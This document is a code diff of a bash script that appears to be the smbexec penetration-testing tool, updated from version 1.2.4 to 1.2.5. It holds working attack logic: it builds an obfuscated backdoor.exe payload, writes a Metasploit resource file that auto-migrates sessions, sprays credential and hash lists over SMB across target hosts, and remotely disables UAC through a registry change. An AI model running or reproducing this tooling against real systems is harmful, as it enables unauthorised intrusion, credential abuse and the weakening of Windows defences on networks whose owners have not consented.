@@ -24,7 +24,7 @@
 #
 #############################################################################################
 
-version="1.2.4"
+version="1.2.5"
 codename="Mommy's Little Monster"
 
 # Check to see if X is running
@@ -35,7 +35,7 @@ else
 fi
 
 # Uncomment the following line to launch Metasploit in a screen session instead of an xterm window.
-# unset isxrunning
+#unset isxrunning
 
 # Uncomment the following line to launch Metasploit in an xterm window if you've tunneled X over SSH.
 #isxrunning=1
@@ -46,7 +46,7 @@ trap f_ragequit 2
 smbexecpath=$(locate -l 1 smbexeclient | sed 's,/*[^/]\+/*$,,')
 
 if [ ! -e $smbexecpath/smbexeclient ] || [ ! -e $smbexecpath/smbwinexe ]; then
-	echo -e "\n\e[1;31m[!] You have to compile the executables first.\e[0m\n\e[1;33m[*] Please run the installer and select option #1.\e[0m\n" 1>&2
+	echo -e "\n\e[1;31m[!] You have to compile the executables first.\e[0m\n\e[1;33m[*] Please run the installer and select option #4.\e[0m\n" 1>&2
 	exit 1
 fi
 
@@ -162,17 +162,14 @@ f_vanish(){
 	}
 
 	f_build_payload(){
-		if [ "$isrhfedora" == "1" ];then
-			mingw=$(find /usr/bin | grep mingw32-gcc$)
-		else
-			mingw=$(find /usr/bin | grep msvc-gcc$|grep 86)
-		fi
+		#Find proper mingw32 to compile the binary
+		mingw=$(find /usr/bin |grep mingw32|grep gcc$|grep -E -v 'amd64|x86_64')
 		
 		echo -e "\n\e[1;33mBuilding your payload please be patient...\e[0m"
 
 		# Create backdoor.exe - puts the file together in order -al14s
 		p=
-		enumber=$((RANDOM%17+3))
+		enumber=$((RANDOM%15+3))
 		seed=$((RANDOM%10000+1))
 		if [[ "$paychoice" -le "2" ]]; then p=" SessionCommunicationTimeout=600"; fi
 		echo -e '#include <stdio.h>\nunsigned char ufs[]=' > $logfldr/backdoor.c
@@ -206,7 +203,7 @@ f_vanish(){
 		echo "set ExitOnSession false" >> $rc
 		echo "set InitialAutoRunScript migrate -f" >> $rc
 		echo "exploit -j -z" >> $rc
-		if [ "$sysexpchoice" == "3" ]; then
+		if [ "$sysexpchoice" == "2" ]; then
 			echo -e "\n\e[1;33mPayload and Resource file successfully created...\e[0m"
 			sleep 3
 			f_mainmenu
@@ -215,7 +212,7 @@ f_vanish(){
 
 			if [ -z $isxrunning ]; then
 				echo -e "\n\e[1;33mLaunching Metasploit in a screen session, once its loaded hit Ctrl-a then a and then d to detach and continue attack setup\e[0m"
-				echo -e "\n\e[1;33mPlease press enter to continue."
+				echo -e "\n\e[1;33mPlease press enter to continue.\e[0m"
 				read -p " "
 				screen -mS Metasploit -t msfconsole bash -c "msfconsole -r $rc"
 			else
@@ -305,8 +302,8 @@ f_banner(){
 }
 
 
-#Function to verify logins can actually login into systems via RDP
-#Metasploit smb_login only verifies login is valid not if they can login to systems remotely
+#Function to verify logins can actually login into systems via C$
+#Metasploit smb_login only verifies login is valid (IPC$) not if they can login to systems remotely as admin
 f_smb_login(){
 f_banner	
 f_get_user_list
@@ -362,6 +359,7 @@ password_hash=
 		if [ "$da_check" = "y" ]; then check_for_da=1; fi
 		echo
 	fi
+	
 	for i in $(cat $RHOSTS); do
 	# Check to see if login is valid
 		for j in $(cat /tmp/smbexec/credentials.lst); do
@@ -439,8 +437,8 @@ f_smb_login
 
 f_uac_setup(){
 f_banner	
-p=
 
+p=
 if [[ -e "$logfldr/host.lst.$(echo $range | cut -d"/" -f1)" ]]; then
 	p="[$logfldr/host.lst.$(echo $range | cut -d"/" -f1)]"
 fi
@@ -457,7 +455,7 @@ if [[ $tf =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
 	    echo -en "   Invalid IP or file does not exist.\n"
 	    sleep 3
 	    f_uac_setup
-    fi
+fi
 
 f_smbauth
 
@@ -476,6 +474,7 @@ for i in $(cat $RHOSTS); do
 		f_smbauthresponse
 		sleep 2
 	fi
+	
 	#Have to unset these because we're in a for loop
 	unset logonfail
 	unset connrefused
@@ -506,7 +505,6 @@ f_uac_check(){
 	fi
 
 }
-
 
 f_disable_uac(){
 	$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f" &> /tmp/smbexec/uac_disable.tmp
@@ -630,7 +628,7 @@ fi
 
 f_banner
 f_smbauth
-#f_finddcs
+f_finddcs
 
 tf=
 while [ -z $tf ]; do
@@ -952,13 +950,12 @@ f_smbauth(){
 	fi
 
 	# Hashes are 65 characters long, this compares input to see if its a password or a hash
-	SMBHASH= #Since the prog is a loop make sure we clear this out
+	unset SMBHASH #Since the prog is a loop make sure we clear this out
 	if [ "$(echo $SMBPass| wc -m)" -ge "65" ]; then
 		export SMBHASH=$SMBPass # This is required when using a hash value
 	fi
 
-	# If a domain account is being used, ask for the domain name if not included in SMBUser
-#	if [ "$sysexpchoice" == "2" ] || [ "$sysenumchoice" == "2" ] || [ "$mainchoice" == "3" ] || [ "$sysenumchoice" == "5" ] ; then 
+	# If a domain account is being used, ask for the domain name if not included in SMBUser 
 	if [[ -n $(echo $SMBUser | awk -F\\ '{printf("%s", $2)}') ]]; then
 		SMBDomain=$(echo $SMBUser | awk -F\\ '{print $1}')
 		SMBUser=$(echo $SMBUser | awk -F\\ '{print $2}')
@@ -966,9 +963,6 @@ f_smbauth(){
 		read -e -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
 		if [ -z $SMBDomain ]; then SMBDomain=.;	fi #equivalent to localhost, thx Mubix!
 	fi
-#	else
-#		SMBDomain=. 
-#	fi
 
 	echo "username=$SMBUser" > /tmp/smbexec/smbexec.auth
 	echo "password=$SMBPass" >> /tmp/smbexec/smbexec.auth
